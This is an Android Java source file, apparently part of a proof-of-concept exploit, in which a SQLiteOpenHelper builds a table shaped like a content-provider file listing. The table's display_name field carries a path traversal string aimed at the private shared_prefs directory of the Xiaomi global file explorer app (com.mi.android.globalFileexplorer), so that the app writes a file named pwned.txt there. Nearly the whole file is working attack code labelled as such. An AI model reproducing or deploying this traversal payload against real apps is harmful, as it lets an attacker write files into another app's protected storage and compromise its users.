package com.fileexplorer.exploit;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

public class DatabaseHelper extends SQLiteOpenHelper {
    private static final String DATABASE_NAME = "exploitDB";
    private static final int DATABASE_VERSION = 1;
    private static final String TAG = "DatabaseHelper"; // Added a TAG for easier log filtering

    public DatabaseHelper(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
        Log.d(TAG, "DatabaseHelper constructor called. Database name: " + DATABASE_NAME); // Log database creation
    }

    @Override
    public void onCreate(SQLiteDatabase db) {
        Log.d(TAG, "onCreate called"); // Log when onCreate is executed
        db.execSQL("CREATE TABLE IF NOT EXISTS exploitTable (size INTEGER, display_name TEXT, _data TEXT);");
        Log.d(TAG, "exploitTable created (or checked for existence)"); // Log table creation
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        Log.d(TAG, "onUpgrade called. Old version: " + oldVersion + ", New version: " + newVersion); // Log database upgrade
        db.execSQL("DROP TABLE IF EXISTS exploitTable");
        Log.d(TAG, "exploitTable dropped"); // Log table drop
        onCreate(db);
    }

    public void insertExploitData() {
        Log.d(TAG, "insertExploitData called"); // Log when insertExploitData is called
        SQLiteDatabase db = this.getWritableDatabase();
        Log.d(TAG, "Writable database obtained: " + db.getPath()); // Log the database path
        try {
            db.execSQL("INSERT INTO exploitTable (size, display_name, _data) VALUES (12345, '../../../../../../../../../../data/data/com.mi.android.globalFileexplorer/shared_prefs/pwned.txt', 'exploit_data');");
            Log.d(TAG, "Inserted exploit data (SQL executed)"); // Log successful SQL execution
        } catch (Exception e) {
            Log.e(TAG, "Error inserting data: " + e.getMessage(), e); // Log any exceptions during insertion
        } finally {
            if (db != null && db.isOpen()) {
                db.close();
                Log.d(TAG, "Database closed"); // Log database closure
            }
        }
    }
}
